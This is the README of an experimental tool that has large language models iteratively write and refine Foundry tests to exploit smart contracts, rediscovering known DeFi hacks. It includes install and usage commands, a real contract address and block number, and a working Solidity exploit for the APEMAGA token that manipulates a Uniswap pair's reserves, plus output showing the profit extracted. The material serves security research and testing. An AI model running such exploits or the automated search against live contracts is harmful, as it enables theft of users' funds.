# Quimera

This is exploit-generator that uses large language models (LLMs) to gradually discover smart contract exploits in Foundry by following these steps:

1. Get the smart contract's source code and write a prompt that describes the goal of the exploit (e.g., the balance should increase after a flashloan).

2. Ask the LLM to create or improve a Foundry test case that tries to exploit the contract.

3. Run the test, check the transaction trace, and see if it made a profit.

4. If it did, stop. If not, go back to step 2 and give the LLM the trace from the failed attempt to help it improve.

**Current Status**: This is an experimental prototype. We’re still figuring out the best settings (like the right temperature), how to write better prompts, and what the tool is really capable of. Here are the results so far re-discovering known exploits using [Gemini Pro 2.5 06-05](https://blog.google/products/gemini/gemini-2-5-pro-latest-preview/):

| Exploit   | Complexity | Comments |
|-----------|------------|----------|
|[APEMAGA](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/dc2cf9e53e9ccaf2eaf9806bad7cd914edefb41b/src/test/2024-06/APEMAGA_exp.sol#L23) | Low    | Only one step needed.|
|[VISOR](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/34cce572d25175ca915445f2ce7f7fbbb7cb593b/src/test/2021-12/Visor_exp.sol#L10)     | Low    | A few steps needed to build the WETH conversion calls, but overall the root cause is identified quickly. |
| [FIRE](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/b3738a7fdffa4b0fc5b34237e70eec2890e54878/src/test/2024-10/FireToken_exp.sol)     | Medium | It will first build the sequence of calls to exploit it, and then slowly adjust the amounts until profit is found. |
| [Thunder-Loan](https://github.com/Cyfrin/2023-11-Thunder-Loan) | Low | This one is part of a CTF? |

# Demo

![Demo](https://i.imgur.com/3Xw7vb8.gif)

# Requirements

* You will need an RPC provider (e.g. Alchemy) and an Etherscan API key. Both have free options.
* An LLM service, either a local (e.g. ollama) or remote LLM service (e.g gemini). **You do not need to pay for an API access, specially if you use "manual mode"**
* [Foundry](https://book.getfoundry.sh/)

# Installation

To install, just run:

```
pip3 install https://github.com/gustavo-grieco/quimera/archive/refs/heads/main.zip
```

If you want to use [different LLM providers](https://llm.datasette.io/en/stable/plugins/directory.html#plugin-directory), you will need to install them as plugins. For instance, to install gemini and ollama support:

```
llm install llm-gemini
llm install llm-ollama
```

Note that in "manual mode", there is no need to install any plugin as the user will be copying and pasting the prompt and responses.

**Important**: when using an LLM to test with an already known exploit, make sure the web search is not enabled, otherwise they can will have access to the original exploit code.

# Getting started

1. Modify the keys.sh file to add the RPC and Etherscan keys.
2. Select a block number `B` and then execute `source keys.sh B`
3. Invoke Quimera:

```
quimera TARGET --model gpt-4o --iterations 5
```

You can use `llm models` to show the available models.

# Running modes

Quimera can work with either deployed contracts (using Etherscan to fetch the source code) or in local mode with a Foundry codebase. To see an example how to use it locally, check the [tests/erc4626](tests/erc4626) directory. It imports the OpenZepelin ERC4626 vault which is instantiated using WETH in the tests. To use quimera, you must define a QuimeraBase contract in the [`test/quimera/QuimeraBase.t.sol`](tests/erc4626/test/quimera/QuimeraBase.t.sol) similar to the example one.

# Example session

This session shows the different steps to re-discover the [APEMAGA exploit](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/dc2cf9e53e9ccaf2eaf9806bad7cd914edefb41b/src/test/2024-06/APEMAGA_exp.sol#L23).
While it is likely that this code is part of the millons used to train, Gemini does not seem to be immediately recalling the exploit from memory, but instead, it seems to be trying to understand the code (at least, in some degree).

```
source keys.sh 20175261
quimera 0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C --model gemini-2.5-pro-preview-06-05 --iterations 10
```

Gemini 2.5 Pro Preview (06-05) was used and produced an exploit on a single attempt (it used to take more in previous models):

```solidity
function executeExploit(uint256 amount) internal {
    // We have `amount` of WETH from the flash loan.
    // Let's use a significant portion to buy the target token.
    uint256 amountToSwap = amount * 90 / 100;

    // Path for swapping WETH -> Tonken
    address[] memory path = new address[](2);
    path[0] = address(valuableToken); // WETH
    path[1] = address(token);         // Tonken

    // 1. Swap WETH for Tonken
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amountToSwap,
        0, // amountOutMin, we take whatever we can get
        path,
        address(this),
        block.timestamp
    );

    // 2. Call the vulnerable 'family' function on the Tonken contract,
    // passing the Uniswap pair's address. This is expected to maliciously
    // reduce the pair's recorded balance of Tonken.
    ITonken(token).family(address(uniswapPair));

    // 3. Call 'sync' on the Uniswap pair. This will update the pair's
    // reserves to match its token balances, which have just been manipulated.
    // The Tonken reserve will drop, artificially inflating its price.
    uniswapPair.sync();

    // Path for swapping Tonken -> WETH
    address[] memory path2 = new address[](2);
    path2[0] = address(token);         // Tonken
    path2[1] = address(valuableToken); // WETH

    // Get our entire balance of Tonken to swap back.
    uint256 tonkenBalance = IERC20(token).balanceOf(address(this));

    // 4. Swap all our Tonken back to WETH at the new, inflated price.
    // The router is already approved from the setUp function.
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tonkenBalance,
        0, // amountOutMin
        path2,
        address(this),
        block.timestamp
    );
}
```

When an exploit is produced, the output shows the amount extracted:

```
[PASS] testFlaw() (gas: 202442)
Logs:
  ...
  Current valuable balance: 36116755288105983138433
  Surplus: 9137102938761881313
  Final balance 9137102938761881313

```

This exploit consumed a few thousands tokens and costed less than 1.25 USD.
